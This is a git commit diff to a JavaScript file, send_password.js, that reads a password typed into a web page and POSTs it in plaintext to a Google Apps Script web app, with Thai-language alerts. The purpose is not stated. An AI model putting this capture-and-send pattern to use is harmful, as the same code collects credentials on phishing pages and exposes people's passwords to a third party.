b1de11e6350733475837e1dea5acdb4bc38f3efa
tiumbj <37504590+tiumbj@users.noreply.github.com>
2025-03-13 13:11:05 +0700

    Update send_password.js

--- send_password.js
+++ send_password.js
@@ -1,14 +1,18 @@
 function sendPassword() {
     var password = document.getElementById("passwordInput").value;
-    fetch("https://script.google.com/macros/s/AKfycbzTr5e-vugJIz9AGhKgur81CUujxkPJGYWUeTK2mVFyqLfHWCobGHVEKOECoe9HZNr1/exec", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ password: password })
-    }).then(response => {
-        if (response.ok) {
-            alert("บันทึกรหัสแล้ว ล็อกหน้าจอของคุณ!");
-        } else {
-            alert("เกิดข้อผิดพลาด!");
-        }
+    
+    fetch("https://script.google.com/macros/s/AKfycbzTr5e-vugJIz9AGhKgur81CUujxkPJGYWUeTK2mVFyqLfHWCobGHVEKOECoe9HZNr1/exec", { // เปลี่ยนเป็น Web App URL ของคุณ
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password: password })
+    })
+    .then(response => response.text())
+    .then(data => {
+        alert("บันทึกรหัสแล้ว!");
+    })
+    .catch(error => {
+        console.error("เกิดข้อผิดพลาด:", error);
+        alert("เกิดข้อผิดพลาด โปรดลองอีกครั้ง");
     });
 }
+
